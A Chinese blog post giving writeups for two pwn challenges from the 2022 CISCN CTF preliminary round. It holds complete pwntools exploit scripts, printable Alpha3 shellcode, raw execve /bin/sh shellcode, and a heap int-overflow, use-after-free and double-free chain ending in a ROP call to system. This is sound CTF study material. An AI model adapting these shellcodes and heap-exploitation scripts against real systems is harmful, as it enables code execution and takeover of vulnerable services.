---
title: 2022 ciscn初赛 pwn Writeup
date: 2022-05-30 11:52:32 +0800
categories: [ctf比赛]
tags: [pwn, ctf]
permalink: /posts/id=24/
pin: false
---

![image-20220530115403566](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220530115403566.png)

## login-nomal(可视化shellcode)

一道类VMpwn，逆出输入方式，发现功能二会开辟一片可执行的空间，直接执行写入的shellcode，这里要绕过isprint，用Alpha3生成可供call跳转执行的可见字符shellcode

![image-20220530115617543](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220530115617543.png)

![image-20220529191312430](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220529191312430.png)

这里讲一下shellcode的生成

先clone一个编译好的alpha3

```bash
git clone https://github.com/TaQini/alpha3.git
```

生成一个shellcode文件

```python
from pwn import *
context.arch='amd64'
sc = shellcraft.sh()
print asm(sc)
```

```bash
python sc.py > shellcode
# 这里要在文件夹外生成，然后拖进alpha3文件夹即可
cd ~/alpha3
./shellcode_x64.sh rdx #利用脚本生成所<call 寄存器>的shellcode，x86同理
```

```python
# _*_ coding:utf-8 _*_
from pwn import *
context(arch='amd64', os='linux')
context.log_level = 'debug'

p = process('./login')
elf = ELF("./login")
libc = elf.libc
def dbg():
    gdb.attach(p)

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))

sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------
def send(con):
	sla(">>> ",con)

def login():
	send("opt: 1\n\r"+'msg: ro0t \n\r\n')

def exita():
	send("opt: 3\n\r"+'msg: eX1t \n\r\n')

def copy(con):
	send("opt: 2\n\r"+'msg: '+con+' \n\r\n')

login()
pay = 'Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00'
copy(pay)
p.interactive()
```

## newest_note(malloc int溢出)

添加权限，执行程序。添加debug信息，把glibc-all-in-one里下好的debug版本的.build放到/usr/lib/debug下。

```bash
sudo chmod +x newest_note
sudo chmod +x libc.so.6
sudo chmod +x ld-linux-x86-64.so.2

cd /usr/lib/debug
sudo mv .build-id/ .build-id.bak
cd ~
sudo mv ~/.build-id/ /usr/lib/debug
```

![image-20220530115802288](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220530115802288.png)

程序已经patch好了，漏洞点在于malloc时8*了一个int类型，造成溢出，从而实现申请小堆但idx极大，实现了任意地址泄露和任意地址写

![image-20220529191907619](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220529191907619.png)

UAF漏洞

![image-20220529192244648](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220529192244648.png)

利用任意地址泄露泄露出栈地址以及libc偏移，free+UAF以及key和heap_base，再用一个doublefree，劫持栈rip执行输入的rop链

```python
# _*_ coding:utf-8 _*_
from pwn import *
context(arch='amd64', os='linux', log_level='debug')

p = process('./newest_note')
# p = remote("39.107.153.91","30623")
elf = ELF("./newest_note")
libc = elf.libc

def dbg():
    gdb.attach(p)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))

sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------

def add(idx,con='a'):
    sla(": ",1)
    sla("Index: ",idx)
    p.sendafter('Content: ',con)

def show(idx):
    sla(": ",3)
    sla("Index: ",idx)

def dele(idx):
    sla(": ",2)
    sla("Index: ",idx)

sla("How many pages your notebook will be? :",str(0x20005000))
show(0x487f5)
stack_addr = uu64()
show(0x4899a)
libc_base = uu64() - 0x218cc0
lg("libc_base")
ret = 0x000000000002d9b9+libc_base
for i in range(10):
    add(i,"a"*0x30)

dele(0)

for i in range(6):
    dele(i+1)

show(0)
ru("Content: ")
key = u64(p.recv(5).ljust(8,'\x00'))
lg("key")
heap_addr = key << 12
lg("heap_addr")

dele(7)
dele(8)
dele(7)

for i in range(7):
    add(i,"a"*0x30)
add(7,p64((stack_addr-0x150-0x8) ^ key ))

add(0,"e4l4")
add(1,"e4l4")
pop_rdi = 0x000000000002e6c5 + libc_base
add(2,p64(0) +p64(ret)+ p64(pop_rdi) + p64(libc_base + libc.search("/bin/sh\x00").next()) + p64(libc_base + libc.sym["system"]) )
p.interactive()
```

